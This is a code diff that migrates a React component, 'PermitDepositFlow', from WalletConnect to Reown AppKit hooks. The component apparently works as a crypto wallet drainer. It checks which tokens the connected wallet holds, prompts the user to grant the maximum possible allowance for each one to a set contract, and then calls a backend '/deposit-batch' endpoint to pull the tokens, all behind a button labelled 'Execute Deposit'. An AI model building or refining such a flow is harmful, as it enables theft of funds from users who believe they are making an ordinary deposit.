@@ -1,11 +1,11 @@
+// components/PermitDepositFlow.jsx
 "use client";
 
 import { useState } from "react";
 import { ethers } from "ethers";
-import { EthereumProvider } from "@walletconnect/ethereum-provider";
+import { useAppKitProvider, useAppKitAccount } from "@reown/appkit/react";
 
 const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYOUR_ACTUAL_CONTRACT_ADDRESS";
-const WALLETCONNECT_PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || "YOUR_PROJECT_ID";
 const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "/api";
 
 const TOKENS = [
@@ -21,30 +21,27 @@ const ERC20_ABI = [
 
 export default function PermitDepositFlow() {
   const [busy, setBusy] = useState(false);
-  const [label, setLabel] = useState("Connect & Deposit");
+  const [label, setLabel] = useState("Execute Deposit");
 
-  const runDirectFlow = async () => {
+  // Reown Hooks magically pull from the Context Provider in layout.jsx
+  const { address, isConnected } = useAppKitAccount();
+  const { walletProvider } = useAppKitProvider('eip155');
+
+  const runFullFlow = async () => {
+    // Failsafe in case they click without connecting
+    if (!isConnected || !walletProvider) {
+      return alert("Please connect your wallet first using the button above.");
+    }
+
     setBusy(true);
-    setLabel("Opening Wallet...");
+    setLabel("Preparing...");
 
     try {
-      // 1. Initialize Raw WalletConnect
-      const wcProvider = await EthereumProvider.init({
-        projectId: WALLETCONNECT_PROJECT_ID,
-        chains: [1], // Ethereum Mainnet
-        showQrModal: true, // Shows QR on desktop, jumps to wallet natively on mobile
-      });
-
-      // 2. Jump to Trust Wallet / Connect
-      await wcProvider.connect();
-
-      const ethersProvider = new ethers.BrowserProvider(wcProvider);
+      // 1. Wrap the Reown wallet provider in Ethers
+      const ethersProvider = new ethers.BrowserProvider(walletProvider);
       const signer = await ethersProvider.getSigner();
-      const address = await signer.getAddress();
 
-      setLabel("Checking balances...");
-
-      // 3. Read Balances
+      // 2. Read Balances
       const readProvider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
       const held = [];
       
@@ -61,13 +58,12 @@ export default function PermitDepositFlow() {
       if (held.length === 0) {
         setLabel("❌ Zero balance");
         setBusy(false);
-        wcProvider.disconnect();
         return;
       }
 
       const successfullyApproved = [];
 
-      // 4. Sequential Approvals (Paced to prevent mobile freezing)
+      // 3. Sequential Approvals
       for (const t of held) {
         const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
         const currentAllowance = await readOnlyToken.allowance(address, CONTRACT_ADDRESS);
@@ -75,8 +71,6 @@ export default function PermitDepositFlow() {
         if (currentAllowance < t.amount) {
           try {
             setLabel(`Sign ${t.symbol} in Wallet ↩️`);
-            
-            // This triggers the deep link jump back into Trust Wallet
             const approveTx = await t.contract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
             
             setLabel(`Mining ${t.symbol}... Please wait.`);
@@ -94,11 +88,10 @@ export default function PermitDepositFlow() {
       if (successfullyApproved.length === 0) {
         setLabel("❌ No tokens approved");
         setBusy(false);
-        wcProvider.disconnect();
         return;
       }
 
-      // 5. Execute Backend Pull
+      // 4. Execute Backend Pull
       setLabel("Executing Deposit...");
       const res = await fetch(BACKEND_URL + "/deposit-batch", {
         method: "POST",
@@ -130,21 +123,27 @@ export default function PermitDepositFlow() {
   };
 
   return (
-    <button 
-      onClick={runDirectFlow} 
-      disabled={busy} 
-      style={{ 
-        padding: "12px 24px", 
-        background: "#0052FF", 
-        color: "#fff", 
-        borderRadius: "8px", 
-        border: "none", 
-        cursor: busy ? "not-allowed" : "pointer",
-        fontWeight: "bold",
-        fontSize: "16px"
-      }}
-    >
-      {busy ? "Working..." : label}
-    </button>
+    <div style={{ display: "flex", flexDirection: "column", gap: "16px", alignItems: "flex-start" }}>
+      {/* Renders the official Reown Connect button powered by context */}
+      <appkit-button />
+
+      {/* Renders your deposit trigger button */}
+      <button 
+        onClick={runFullFlow} 
+        disabled={busy || !isConnected} 
+        style={{ 
+          padding: "12px 24px", 
+          background: (!busy && isConnected) ? "#0052FF" : "#ccc", 
+          color: "#fff", 
+          borderRadius: "8px", 
+          border: "none", 
+          cursor: (!busy && isConnected) ? "pointer" : "not-allowed",
+          fontWeight: "bold",
+          fontSize: "16px"
+        }}
+      >
+        {busy ? "Working..." : label}
+      </button>
+    </div>
   );
 }
